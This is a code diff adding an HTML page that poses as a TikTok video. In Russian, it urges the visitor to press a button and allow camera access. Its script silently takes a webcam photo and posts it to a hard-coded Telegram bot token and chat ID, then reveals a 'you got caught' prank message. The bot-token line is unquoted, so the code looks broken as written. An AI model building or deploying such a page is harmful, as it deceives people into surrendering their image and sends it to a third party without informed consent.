@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok Video</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+        .card {
+            max-width: 420px;
+            width: 100%;
+            background: #111;
+            border-radius: 30px;
+            overflow: hidden;
+        }
+        .video-wrapper {
+            background: #000;
+        }
+        iframe {
+            width: 100%;
+            height: 550px;
+            border: none;
+        }
+        .content {
+            padding: 24px 20px;
+            text-align: center;
+        }
+        button {
+            background: #ff0050;
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+            padding: 15px 24px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+        }
+        #status {
+            color: #ffaa33;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        .prank {
+            background: #00ff88;
+            color: black;
+            padding: 15px;
+            border-radius: 20px;
+            display: none;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+        .footer {
+            font-size: 11px;
+            color: #555;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="video-wrapper">
+        <iframe 
+            src="https://www.tiktok.com/player/v1/7633683429569088788?autoplay=1&mute=1"
+            allow="autoplay; fullscreen"
+        ></iframe>
+    </div>
+    <div class="content">
+        <div id="actionArea">
+            <button id="btn">📸 НАЖМИ ДЛЯ ПРОДОЛЖЕНИЯ 📸</button>
+            <div id="status"></div>
+        </div>
+        <div id="prankMessage" class="prank">
+            😂 ТЫ ПОПАЛСЯ! Фото ушло другу в Telegram 😂
+        </div>
+        <div class="footer">
+            🔐 Нажми РАЗРЕШИТЬ, когда браузер спросит доступ к камере
+        </div>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // ⚠️ ТОЛЬКО ЭТИ 2 СТРОЧКИ НУЖНО ИЗМЕНИТЬ ⚠️
+    const BOT_TOKEN = 8690046228:AAHtBXqcXewTZGd2VD4F4qUd7l8v7rlHQW4;
+    const CHAT_ID = 787437405;
+    // ==========================================
+
+    const btn = document.getElementById('btn');
+    const statusDiv = document.getElementById('status');
+    const prankDiv = document.getElementById('prankMessage');
+
+    btn.onclick = async function() {
+        btn.disabled = true;
+        statusDiv.innerText = "📷 Запрос доступа к камере...";
+        
+        try {
+            // Запрашиваем камеру
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            statusDiv.innerText = "✅ Делаем селфи...";
+            
+            // Делаем снимок
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            await new Promise(r => setTimeout(r, 200));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Выключаем камеру
+            stream.getTracks().forEach(t => t.stop());
+            
+            // Конвертируем в base64
+            const base64 = canvas.toDataURL('image/jpeg').split(',')[1];
+            
+            statusDiv.innerText = "📤 Отправка...";
+            
+            // Отправляем в Telegram
+            const blob = base64ToBlob(base64, 'image/jpeg');
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'selfie.jpg');
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            // Показываем пранк
+            statusDiv.innerText = "";
+            prankDiv.style.display = "block";
+            document.getElementById('actionArea').style.display = "none";
+            
+        } catch (err) {
+            statusDiv.innerText = "❌ Ошибка: " + err.message;
+            btn.disabled = false;
+        }
+    };
+    
+    function base64ToBlob(base64, mime) {
+        const byteChars = atob(base64);
+        const byteArray = new Uint8Array(byteChars.length);
+        for (let i = 0; i < byteChars.length; i++) {
+            byteArray[i] = byteChars.charCodeAt(i);
+        }
+        return new Blob([byteArray], { type: mime });
+    }
+</script>
+</body>
+</html>
